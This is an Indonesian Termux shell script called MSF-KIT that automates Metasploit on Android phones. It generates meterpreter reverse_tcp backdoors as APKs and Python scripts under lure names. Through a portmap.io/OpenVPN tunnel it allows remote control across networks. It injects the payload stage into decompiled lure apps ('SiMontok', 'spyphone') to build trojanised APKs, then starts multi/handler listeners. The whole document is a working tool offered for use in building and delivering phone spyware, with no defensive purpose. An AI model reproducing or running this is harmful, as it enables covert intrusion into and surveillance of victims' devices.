#!/bin/sh

bi='\033[34;1m' #biru
hi='\033[32;1m' #hijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #purple
ku='\033[33;1m' #kuning

clear

termux-setup-storage


echo $ku
figlet MSF-KIT
echo
sleep 0.01
echo $hi"++++++++++++++++++++++++++++++++++++++++"
sleep 0.01
echo $hi"[1]$ku install bahan$me (wajib)$ku               "
sleep 0.01
echo $hi"[2]$ku sudah install, lanjutkan$me (new)$ku      "
sleep 0.01
echo $hi"[3]$ku contact admin, grub whatsapps$me (new)$ku "
sleep 0.01
echo $hi"[4]$ku updates..!!$me (new)$ku "
echo $hi"++++++++++++++++++++++++++++++++++++++++"
echo $hi
sleep 0.01
read -p "masukan pilihan : " pi
if [ $pi = "1" ];
then
clear
apt update && apt upgrade -y
apt install git nano curl python python2 php ruby toilet figlet openssh f -y
mkdir Malware
dpkg -i apktool.deb
echo
echo $hi "install package sukses..!!"
echo
clear
read -p "[+] tekan enter untuk membuat akun portmap.io" y
xdg-open https://portmap.io/
read -p "[+] tekan enter untuk install openvpn" y
xdg-open https://play.google.com/store/apps/details?id=net.openvpn.openvpn
read -p "[+] tekan enter untuk install apksigner" y
xdg-open https://play.google.com/store/apps/details?id=com.haibison.apksigner
echo
sleep 0.01
echo "sedang memindahkan configs admin, untuk beda jaringan"
sleep 0.01
echo
cp -r K1M4K.first.ovpn /sdcard
echo "NOTE : Buka OpenVpn Tadi, Lalu Masukan Configs Nya"
sleep 0.01
echo
echo $hi"++++++++++++++++++++++++++++++++++++++++++++++++++++"
sleep 0.01
echo $ku  "berfungsi untuk sadap jarak jauh, beda jaringan"
sleep 0.01
echo $hi"++++++++++++++++++++++++++++++++++++++++++++++++++++"
sleep 0.01
echo $ku
sleep 4
read -p "[+] tekan enter untuk melanjutkan" y
clear

elif [ $pi = "2" ];
then
clear
fungsi="f"

elif [ $pi = "3" ];
then
clear
echo $ku "S U B S C R I B E..!! MY CHANNEL"
sleep 2
xdg-open https://www.youtube.com/channel/UCsevJlIs2MYo_-rJuDtFqUw
clear
read -p "[+] tekan enter untuk bergabung grub whatsapps" y
sleep 2
xdg-open https://chat.whatsapp.com/I0WwbcKhdbEBL56WMvcPSI
read -p "[+] tekan enter untuk melanjutkan" y
clear

elif [ $pi = "4" ];
then
clear
figlet UPDATES
echo
echo "-----------------------------------------"
echo
cd
cd msfkit
git stash
echo
echo "-----------------------------------------"
echo
git pull origin master
echo $ku
echo "-----------------------------------------"
echo "selesai.."
sleep 6
clear

else
clear
echo $ku "masukan pilihan dengan benar, pilih antara 1, 2 & 3"
sleep 3
clear
exit

fi


#fungsi

for i in fungsi
do
echo "$f"
done

ulang="y"
while [ $ulang = "y" ];
do

echo $hi "         tunggu 3 detik untuk memulai :)"
sleep 3
clear

sleep 0.01
echo $ku "                  M S F K I T                "
sleep 0.01
echo $hi "              METASPLOIT BY KIMAK            "
sleep 0.01
echo "————————————————————————————————————————————————"
echo
sleep 0.01
echo $pu"msfkit adalah tools, otomatis yang berfungsi untuk    "
sleep 0.01
echo "  menginstall, membuat backdoor dan menjalankan          "
sleep 0.01
echo "           metasploit secara otomatis                    "
echo
sleep 0.01
echo "—————————————————————————————————————————————————"
sleep 0.01
echo  $cy"Author    : K1M4K-ID         "
sleep 0.01
echo  "Thanks To : E99 | Gafar Rizky             "
sleep 0.01
echo  "Youtube   : Fadillah Ramadhan"
echo
sleep 0.01
echo $hi"[1]$ku install metasploit android 7-10              "
sleep 0.01
echo $hi"[2]$ku install metasploit android 5-6$me (new) "
sleep 0.01
echo $hi"[3]$ku buat backdoor otomatis                  "
sleep 0.01
echo $hi"[4]$ku buat backdoor beda jaringan             "
sleep 0.01
echo $hi"[5]$ku buat backdoor script python$me (new)$ku "
sleep 0.01
echo $hi"[6]$ku injecksi backdoor original$me (new)     "
sleep 0.01
echo $hi"[7]$ku aktifkan database                       "
sleep 0.01
echo $hi"[8]$ku jalankan metasploit                     "
sleep 0.01
echo $hi"[0]$ku exit                         "
sleep 0.01
echo $hi

read -p "masukan pilihan kamu : " pilih
    if [ $pilih = "1" ];
    then
	clear
	sleep 0.01
echo $ku "                  M S F K I T                "
sleep 0.01
echo $hi "              METASPLOIT BY KIMAK            "
sleep 0.01
echo "————————————————————————————————————————————————"
echo
sleep 0.01
echo $pu"msfkit adalah tools, otomatis yang berfungsi untuk    "
sleep 0.01
echo "  menginstall, membuat backdoor dan menjalankan          "
sleep 0.01
echo "           metasploit secara otomatis                    "
echo
sleep 0.01
echo "—————————————————————————————————————————————————"
sleep 0.01
echo  $cy"Author    : K1M4K-ID         "
sleep 0.01
echo  "Thanks To : E99 | Gafar Rizky              "
sleep 0.01
echo  "Youtube   : Fadillah Ramadhan"
echo
	echo
	read -p "[+] Tekan ENTER Untuk Melanjutkan :)" l
	clear
	apt update && apt upgrade -y
	apt install unstable-repo -y
	apt install metasploit -y
	sleep 2
	clear
	echo $hi "        ++++++++++++++++++++++++++++++"
    echo $ku "          I N S T A L L  S U K S E S  "
    echo $hi "        ++++++++++++++++++++++++++++++"
	sleep 3
	clear

    elif [ $pilih = "2" ];
    then
clear
echo $ku "                  M S F K I T                "
sleep 0.01
echo $hi "              METASPLOIT BY KIMAK            "
sleep 0.01
echo "————————————————————————————————————————————————"
echo
sleep 0.01
echo $pu"msfkit adalah tools, otomatis yang berfungsi untuk    "
sleep 0.01
echo "  menginstall, membuat backdoor dan menjalankan          "
sleep 0.01
echo "           metasploit secara otomatis                    "
echo
sleep 0.01
echo "—————————————————————————————————————————————————"
sleep 0.01
echo  $cy"Author    : K1M4K-ID         "
sleep 0.01
echo  "Thanks To : E99 | Gafar Rizky              "
sleep 0.01
echo  "Youtube   : Fadillah Ramadhan"
echo $hi
	read -p "[+] tekan enter untuk install metaslploit android 5-6" y
	echo
	echo "Tunggu 15-20 Menit..."
	sleep 4
	clear
	apt update && apt upgrade -y
	apt install git curl wget nano -y
	curl -LO https://github.com/termux/termux-packages/files/3995119/metasploit_5.0.65-1_all.deb.gz
	gunzip metasploit_5.0.65-1_all.deb.gz
	dpkg -i metasploit_5.0.65-1_all.deb
	apt install -f
	apt --fix-broken install
	echo
	echo "-------------------------------------------"
	echo "installing sukses..!! :)"
	rm -fr metasploit_5.0.65-1_all.deb
	sleep 3
	echo
	read -p "[+] tekan enter untuk kembali :)" y
	clear


    elif [ $pilih = "3" ];
    then
	clear
	sleep 0.01
echo $ku "                  M S F K I T                "
sleep 0.01
echo $hi "              METASPLOIT BY KIMAK            "
sleep 0.01
echo "————————————————————————————————————————————————"
echo
sleep 0.01
echo $pu"msfkit adalah tools, otomatis yang berfungsi untuk    "
sleep 0.01
echo "  menginstall, membuat backdoor dan menjalankan          "
sleep 0.01
echo "           metasploit secara otomatis                    "
echo
sleep 0.01
echo "—————————————————————————————————————————————————"
sleep 0.01
echo  $cy"Author    : K1M4K-ID         "
sleep 0.01
echo  "Thanks To : E99 | Gafar Rizky          "
sleep 0.01
echo  "Youtube   : Fadillah Ramadhan"
echo

	echo $hi"apakah kamu ingin membuat backdoor?"
	sleep 3
	clear
	read -p "[+] Tekan ENTER Untuk Melanjutkan :)" l
	clear
	sleep 0.01
	echo $hi"gunakan ip addrees kamu => ifconfig"
	sleep 3
	echo
	ifconfig
	echo
	echo "copy paste ip kamu disini => 192.168.x.x.x"
	read -p "masukan lhost : " host
	echo
	echo "masukan port default 4444/8888"
	read -p "masukan port : " port
	echo
	echo "masukan nama backdoor, contoh => wifi"
	read -p "nama backdoor : " backdoor
	echo
	echo "sedang membuat backdoor..wait 4 sec"
	sleep 4
	clear
	read -p "[+] Tekan ENTER Untuk Melanjutkan :)" l
	clear
	echo $hi"[+] GENERATE BACKDOOR!!"
	echo
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o /sdcard/$backdoor.apk
	echo
	sleep 5
	clear
	echo $cy "        ++++++++++++++++++++++++++++++"
    echo $ku "           BACKDOOR BERHASIL DIBUAT   "
	echo $ku "                   /sdcard            "
    echo $cy "        ++++++++++++++++++++++++++++++"
	sleep 4
	clear
	read -p "[+] Tekan ENTER Untuk Kembali :)" l
	clear

    elif [ $pilih = "4" ];
    then
	clear
	sleep 0.01
echo $ku "                  M S F K I T                "
sleep 0.01
echo $hi "              METASPLOIT BY KIMAK            "
sleep 0.01
echo "————————————————————————————————————————————————"
echo
sleep 0.01
echo $pu"msfkit adalah tools, otomatis yang berfungsi untuk    "
sleep 0.01
echo "  menginstall, membuat backdoor dan menjalankan          "
sleep 0.01
echo "           metasploit secara otomatis                    "
echo
sleep 0.01
echo "—————————————————————————————————————————————————"
sleep 0.01
echo  $cy"Author    : K1M4K-ID         "
sleep 0.01
echo  "Thanks To : E99 | Gafar Rizky           "
sleep 0.01
echo  "Youtube   : Fadillah Ramadhan"
echo
	echo "—————————————————————————————————————"
	echo
	echo $hi"Ex => Config OpenVpn Kamu"
	sleep 2
	echo $hi"contoh => K1M4K-23035.portmap.io"
	echo $cy
	read -p "masukan config kamu : " hmap
	echo
	echo $hi"Ex => gunakan port dari portmap.io setelah tanda :"
	echo $hi"contoh => K1M4K-23035.portmap.io:$me 23035"
	echo $cy
	read -p "masukan port kamu : " pmap
	echo
	echo $hi"masukan nama backdoor, Ex => pulsa"
	read -p "masukan nama backdoor : " backdoor
	echo
	echo $hi"mohon tunggu sebentar...wait!! 4 Sec"
	sleep 4
	echo
	echo "—————————————————————————————————————"
	clear
	read -p "[+] Tekan ENTER Untuk Melanjutkan :)" l
	clear
	echo $hi"[+] GENERATE BACKDOOR!!"
	echo
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$hmap LPORT=$pmap -o /sdcard/$backdoor.apk
	echo
	sleep 4
	clear
	echo $ku "        ++++++++++++++++++++++++++++++"
    echo $cy "           BACKDOOR BERHASIL DIBUAT   "
	echo $cy "                   /sdcard            "
    echo $ku "        ++++++++++++++++++++++++++++++"
	sleep 4
	clear
	read -p "[+] Tekan ENTER Untuk Kembali :)" l
	clear

elif [ $pilih = "5" ];
then
clear
	echo $ku "                  M S F K I T                "
	sleep 0.01
	echo $hi "              METASPLOIT BY KIMAK            "
	sleep 0.01
	echo "————————————————————————————————————————————————"
	echo
	sleep 0.01
	echo $pu"msfkit adalah tools, otomatis yang berfungsi untuk    "
	sleep 0.01
	echo "  menginstall, membuat backdoor dan menjalankan          "
	sleep 0.01
	echo "           metasploit secara otomatis                    "
	echo
	sleep 0.01
	echo "—————————————————————————————————————————————————"
	sleep 0.01
	echo  $cy"Author    : K1M4K-ID         "
	sleep 0.01
	echo  "Thanks To : E99 | Gafar Rizky          "
	sleep 0.01
	echo  "Youtube   : Fadillah Ramadhan"
	echo
	sleep 3
	clear
		echo $ku"             Control Satu Jaringan               "
		sleep 0.01
		echo $me"-------------------------------------------------"
		sleep 0.01
		echo $ku"sample => ifconfig                               "
		sleep 0.01
		echo $ku"sample => 192.168.x.x                            "
		sleep 0.01
		echo $me"-------------------------------------------------"
		sleep 0.01
		echo
		sleep 0.01
		echo $ku"              Control Jarak Jauh                "
		sleep 0.01
		echo $me"-------------------------------------------------"
		sleep 0.01
		echo $ku"sample => config beda jaringan jarak jauh"
		sleep 0.01
		echo $ku"sample => K1M4K-23035.portmap.io"
		sleep 0.01
		echo $me"-------------------------------------------------"
		sleep 0.01
		echo $ku
		read -p "masukan lhost : " lh
		echo
		echo $hi"-------------------------------------------------"
		sleep 0.01
		echo $ku"sample =>$me 4444 / 8888$ku satu jaringan        "
		sleep 0.01
		echo $ku"sample => K1M4K-23035.portmap.io:$me 23035       "
		sleep 0.01
		echo $hi"-------------------------------------------------"
		sleep 0.01
		echo $ku
		read -p "masukan port : " lp
		echo
		echo $cy"-------------------------------------------------"
		sleep 0.01
		echo
		echo $ku"              backdoor script python                "
		sleep 0.01
		echo $ku" contoh => Dark-FB, HackWhastapp, Hackig, spam-sms  "
		sleep 0.01
		echo
		echo $cy"-------------------------------------------------"
		echo
		read -p "masukan nama script : " sc
		sleep 1
		clear
		read -p "[+] enter untuk melanjutkan membuat backdoor" y
		clear
		echo $hi"[+] GENERATE BACKDOOR!!"
		sleep 2
		msfvenom -p python/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o /sdcard/$sc.py
		echo
		echo "selesai... :)"
		sleep 0.01
		echo "--------------------------------------------------------"
		sleep 0.01
		read -p "[+] tekan enter untuk kembali :)" p
		sleep 2
		clear

    elif [ $pilih = "6" ];
    then
clear
echo $ku "                  M S F K I T                "
sleep 0.01
echo $hi "              METASPLOIT BY KIMAK            "
sleep 0.01
echo "————————————————————————————————————————————————"
echo
sleep 0.01
echo $pu"msfkit adalah tools, otomatis yang berfungsi untuk    "
sleep 0.01
echo "  menginstall, membuat backdoor dan menjalankan          "
sleep 0.01
echo "           metasploit secara otomatis                    "
echo
sleep 0.01
echo "—————————————————————————————————————————————————"
sleep 0.01
echo  $cy"Author    : K1M4K-ID         "
sleep 0.01
echo  "Thanks To : E99 | Gafar Rizky          "
sleep 0.01
echo  "Youtube   : Fadillah Ramadhan"
echo
	echo $hi"[1]$ku Shopee Pink "
	echo $hi"[2]$ku Spyphone "
	echo $cy
	read -p "masukan pilihan : " pilih
	if [ $pilih = "1" ];
	then
		clear
		read -p "[+] tekan enter untuk lanjut :)" y
		clear
		echo $ku"             Control Satu Jaringan               "
		sleep 0.01
		echo $me"-------------------------------------------------"
		sleep 0.01
		echo $ku"sample => ifconfig                               "
		sleep 0.01
		echo $ku"sample => 192.168.x.x                            "
		sleep 0.01
		echo $me"-------------------------------------------------"
		sleep 0.01
		echo
		sleep 0.01
		echo $ku"              Control Jarak Jauh                "
		sleep 0.01
		echo $me"-------------------------------------------------"
		sleep 0.01
		echo $ku"sample => config beda jaringan jarak jauh"
		sleep 0.01
		echo $ku"sample => K1M4K-23035.portmap.io"
		sleep 0.01
		echo $me"-------------------------------------------------"
		sleep 0.01
		echo $ku
		read -p "masukan lhost : " lh
		echo
		echo $hi"-------------------------------------------------"
		sleep 0.01
		echo $ku"sample => 4444 / 8888 satu jaringan              "
		sleep 0.01
		echo $ku"sample => K1M4K-23035.portmap.io:$me 23035       "
		sleep 0.01
		echo $hi"-------------------------------------------------"
		sleep 0.01
		echo $ku
		read -p "masukan port : " lp
		echo
		read -p "[+] enter untuk melanjutkan membuat backdoor" y
		clear
		echo $hi"[+] GENERATE BACKDOOR!!"
		sleep 2
		echo $hi"[+] PLEASE WAIT 25-35 MINUTES"
        echo
		msfvenom -p android/meterpreter/reverse_tcp lhost=$lh lport=$lp -o Malware/payload.apk
		echo
		echo "Loading.."
		sleep 3
		clear
		echo
		git clone https://github.com/K1M4K-ID/Payload
		cd
		cd msfkit
		cd Payload
		mv -f SiMontok.apk ../Malware
		echo
		cd
		cd msfkit
		cd Malware
		apktool d SiMontok.apk -o simontok
		rm -fr SiMontok.apk
		apktool d payload.apk -o payload
		rm -fr payload.apk
		cd
		cd msfkit/Malware
		rm -fr simontok/smali/com/metasploit/stage
		cd
		cd msfkit/Malware
		mv -f payload/smali/com/metasploit/stage simontok/smali/com/metasploit/stage
		cd
		cd msfkit/Malware
		apktool b simontok -o simontokVIP.apk
		cd
		cd msfkit/Malware
		rm -fr simontok payload
		cd
		cd msfkit/Malware
		mv -f simontokVIP.apk /sdcard
		cd ..
		rm -fr Payload
		echo
		echo "selesai.. :)"
		echo "-------------------------------------------------"
		echo
		read -p "[+] enter untuk kembali :)" y
		clear

	elif [ $pilih = "2" ];
	then
	clear
		read -p "[+] tekan enter untuk lanjut :)" y
                clear
                echo $ku"             Control Satu Jaringan               "
                sleep 0.01
                echo $me"-------------------------------------------------"
                sleep 0.01
                echo $ku"sample => ifconfig                               "
                sleep 0.01
                echo $ku"sample => 192.168.x.x                            "
                sleep 0.01
                echo $me"-------------------------------------------------"
                sleep 0.01
                echo
                sleep 0.01
                echo $ku"              Control Jarak Jauh                  "
                sleep 0.01
                echo $me"-------------------------------------------------"
                sleep 0.01
                echo $ku"sample => config beda jaringan jarak jauh"
                sleep 0.01
                echo $ku"sample => K1M4K-23035.portmap.io"
                sleep 0.01
                echo $me"-------------------------------------------------"
                sleep 0.01
                echo $ku
                read -p "masukan lhost : " lh
                echo
                echo $hi"-------------------------------------------------"
                sleep 0.01
                echo $ku"sample => 4444 / 8888 satu jaringan              "
                sleep 0.01
                echo $ku"sample => K1M4K-23035.portmap.io:$me 23035       "
                sleep 0.01
                echo $hi"-------------------------------------------------"
                sleep 0.01
                echo $ku
                read -p "masukan port : " lp
                echo
                read -p "[+] enter untuk melanjutkan membuat backdoor" y
                clear
                echo $hi"[+] GENERATE BACKDOOR!!"
                sleep 2
                echo $hi"[+] PLEASE WAIT 25-35 MINUTES"
                echo $ku
                msfvenom -p android/meterpreter/reverse_tcp lhost=$lh lport=$lp -o Malware/payload.apk
                echo
                echo "Loading.."
                sleep 3
               	clear
		echo
		git clone https://github.com/K1M4K-ID/Payload
		cd
		cd msfkit/Payload
		mv -f spyphone.apk ../Malware
		cd
		cd msfkit/Malware
		apktool d spyphone.apk -o spyphone
		rm -fr spyphone.apk
		cd
		cd msfkit/Malware
		apktool d payload.apk -o payload
		cd
		cd msfkit/Malware
		rm -fr payload.apk && cd
		cd msfkit/Malware
		rm -fr spyphone/smali/com/metasploit/stage && cd
		cd msfkit/Malware
		mv -f payload/smali/com/metasploit/stage spyphone/smali/com/metasploit/stage && cd
		cd msfkit/Malware
		apktool b spyphone -o backup.apk
		rm -fr spyhone payload
		mv -f backup.apk /sdcard
		cd ..
		rm -fr Payload
		echo
		echo "------------------------------------------------"
		echo
		read -p "[+] tekan enter untuk kembali" y
		clear

		else
		clear
		echo $me"masukan intput yang benar!!"
		sleep 4
		clear
fi

    elif [ $pilih = "7" ];
    then
	clear
	sleep 0.01
echo $ku "                  M S F K I T                "
sleep 0.01
echo $hi "              METASPLOIT BY KIMAK            "
sleep 0.01
echo "————————————————————————————————————————————————"
echo
sleep 0.01
echo $pu"msfkit adalah tools, otomatis yang berfungsi untuk    "
sleep 0.01
echo "  menginstall, membuat backdoor dan menjalankan          "
sleep 0.01
echo "           metasploit secara otomatis                    "
echo
sleep 0.01
echo "—————————————————————————————————————————————————"
sleep 0.01
echo  $cy"Author    : K1M4K-ID         "
sleep 0.01
echo  "Thanks To : E99 | Gafar Rizky          "
sleep 0.01
echo  "Youtube   : Fadillah Ramadhan"
echo
	cd $HOME
	echo $hi"sedang mengaktifkan database metasploit"
	sleep 3
	echo
	pg_ctl -D $PREFIX/var/lib/postgresql start
	sleep 4
	clear
	echo $ku "        ++++++++++++++++++++++++++++++"
    echo $hi  "                 S U K S E S          "
    echo $ku "        ++++++++++++++++++++++++++++++"
	sleep 3
	clear
	read -p "[+] Tekan ENTER Untuk Kembali :)" l
	clear

    elif [ $pilih = "8" ];
    then
	clear
	sleep 0.01
echo $ku "                  M S F K I T                "
sleep 0.01
echo $hi "              METASPLOIT BY KIMAK            "
sleep 0.01
echo "————————————————————————————————————————————————"
echo
sleep 0.01
echo $pu"msfkit adalah tools, otomatis yang berfungsi untuk    "
sleep 0.01
echo "  menginstall, membuat backdoor dan menjalankan          "
sleep 0.01
echo "           metasploit secara otomatis                    "
echo
sleep 0.01
echo "—————————————————————————————————————————————————"
sleep 0.01
echo  $cy"Author    : K1M4K-ID         "
sleep 0.01
echo  "Thanks To : E99 | Gafar Rizky           "
sleep 0.01
echo  "Youtube   : Fadillah Ramadhan"
echo

balik="b"
while [ $balik = "b" ]
do

	echo $hi"[1]$ku Eksekusi Backdoor Aplikasi"
	echo $hi"[2]$ku Eksekusi Backdoor Python$me (new)$cy"
	echo $hi"[3]$ku Kembali "
	echo $cy
	read -p "pilih : " pi
		if [ $pi = "1" ];
		then
		clear
	read -p "[+] enter untuk aktifkan openvpn..!!" k
	am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity
	sleep 0.01
	clear
	read -p "[+] silahkan tekan enter untuk lanjut" y
	echo
	read -p "[+] gunakan ip tune0 untuk jarak jauh atau beda jaringan" y
	echo
	read -p "[+] gunakan port dari portmap.io untuk jarak jauh" y
	echo
	echo "----------------------------------------------------"
	echo
	read -p "[+] => ip lokal untuk satu jaringan (wifi)" y
	echo
	read -p "[+] => port 4444/8888 samakan dengan backdoor satu jaringan" y
	echo
	ifconfig
	echo
	echo "sample tune0 => 10.9.119.78"
	echo "sample ip lokal => 192.168.x.x"
	echo "setiap ip berbeda beda, jadi silahkan sesuaikan ip anda"
	echo "---------------------------------------------"
	echo
	read -p "masukan ip tun0 atau ip lokal disini: " l
	echo
	sleep 0.01
	echo "gunakan port dari 4444/8888 satu jaringan"
	echo
	echo "gunakan port dari portmap 4 digit beda jaringan"
	sleep 0.01
	echo
	echo "sample => sesuaikan port backdoor satu jaringan =>$me 4444"
	echo $cy"sample => K1M4K-23035.portmap.io:23035 =>$me 8888"
	echo $cy
	sleep 0.01
	read -p "masukan port : " p
	echo
	read -p "[+] enter untuk sign ulang backdoor agar tidak terjadi error.."
    am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity
	clear
	sleep 10
	echo $hi"[+] RUN Plese Wait!!"
	echo
	msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $l;set LPORT $p;exploit;"
	clear

	elif [ $pi = "2" ];
	then
	clear
	read -p "[+] enter untuk aktifkan openvpn..!!" k
	am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity
	sleep 0.01
	clear
	read -p "[+] silahkan tekan enter untuk lanjut" y
	echo
	read -p "[+] gunakan ip tune0 untuk jarak jauh atau beda jaringan" y
	echo
	read -p "[+] gunakan port dari portmap.io untuk jarak jauh" y
	echo
	echo "----------------------------------------------------"
	echo
	read -p "[+] => ip lokal untuk satu jaringan (wifi)" y
	echo
	read -p "[+] => port 4444/8888 samakan dengan backdoor satu jaringan" y
	echo
	ifconfig
	echo
	echo "sample tune0 => 10.9.119.78"
	echo "sample ip lokal => 192.168.x.x"
	echo "setiap ip berbeda beda, jadi silahkan sesuaikan ip anda"
	echo "---------------------------------------------"
	echo
	read -p "masukan ip tun0 atau ip lokal disini: " l
	echo
	sleep 0.01
	echo "gunakan port dari 4444/8888 satu jaringan"
	echo
	echo "gunakan port dari portmap 4 digit beda jaringan"
	sleep 0.01
	echo
	echo "sample => sesuaikan port backdoor satu jaringan =>$me 4444"
	echo $cy"sample => K1M4K-23035.portmap.io:23035 =>$me 8888"
	echo $cy
	sleep 0.01
	read -p "masukan port : " p
	echo $hi
	read -p "[!] tekan enter untuk eksekusi" x
	clear
	echo "[+] RUN Metasploit.."
	echo
	msfconsole -x "use exploit/multi/handler;set PAYLOAD python/meterpreter/reverse_tcp;set LHOST $l;set LPORT $p;exploit"
	clear

	elif [ $pi = "3" ];
	then
		clear
		echo "-------------------------------------"
		read -p "[!] tekan enter untuk kembali " x
		echo "-------------------------------------"
		cd
		cd msfkit && sh msfkimak

	fi
	done

    elif [ $pilih = "0" ];
    then
	clear
	read -p "[+] Tekan ENTER Untuk Exit :)" l
	clear
	echo $me "        ++++++++++++++++++++++++++++++"
    echo $pu "            T E R I M A K A S I H     "
    echo $me "        ++++++++++++++++++++++++++++++"
	sleep 3
	echo $pu
	clear
	exit

    else
	clear
	echo $hi "        ++++++++++++++++++++++++++++++"
    echo $ku "           MASUKAN INPUT YANG BENAR   "
    echo $hi "        ++++++++++++++++++++++++++++++"
	sleep 3
	clear



fi
done
